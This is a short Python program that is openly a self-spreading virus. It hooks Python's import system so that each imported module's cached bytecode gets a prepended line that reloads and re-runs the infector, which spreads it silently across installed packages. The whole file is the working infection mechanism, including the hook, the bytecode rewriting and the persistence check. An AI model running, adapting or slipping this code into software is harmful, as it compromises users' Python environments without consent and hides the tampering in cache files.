#! /usr/bin/env python3

import importlib._bootstrap_external
import importlib.machinery
import importlib.util
import os
import sys

INFECTION = """
from importlib.machinery import SourceFileLoader
foo = SourceFileLoader("infector", "{}").load_module().main()
"""


def infect(filename):
    """Squash errors while infecting the given file."""
    try:
        _infect(filename)
    except Exception:
        raise  # Pass to avoid errors


def _infect(filename):
    """Infect the given file."""
    cfile = importlib.util.cache_from_source(filename)
    loader = importlib.machinery.SourceFileLoader('<py_compile>', filename)
    source_bytes = loader.get_data(filename)
    source_bytes = INFECTION.format(__file__).encode("ascii") + source_bytes
    code = loader.source_to_code(source_bytes, filename)
    try:
        dirname = os.path.dirname(cfile)
        if dirname:
            os.makedirs(dirname)
    except FileExistsError:
        pass
    source_stats = loader.path_stats(filename)
    bytecode = importlib._bootstrap_external._code_to_bytecode(
            code, source_stats['mtime'], source_stats['size'])
    mode = importlib._bootstrap_external._calc_mode(filename)
    importlib._bootstrap_external._write_atomic(cfile, bytecode, mode)


class InfectImporter():
    _virus = True

    def __init__(self):
        self.inside = False
        for obj in sys.meta_path:
            if getattr(obj, "_virus", None):
                print("found")
                break
        else:
            print ("adding infector")
            sys.meta_path = [self] + sys.meta_path

    def find_spec(self, name, path=None, target=None):
        if not self.inside:
            self.inside = True
            spec = importlib.util.find_spec(name, path)
            infect(spec.origin)
            self.inside = False
        return None


def main():
    print("Infected")
    InfectImporter()

if __name__ == "__main__":
    main()
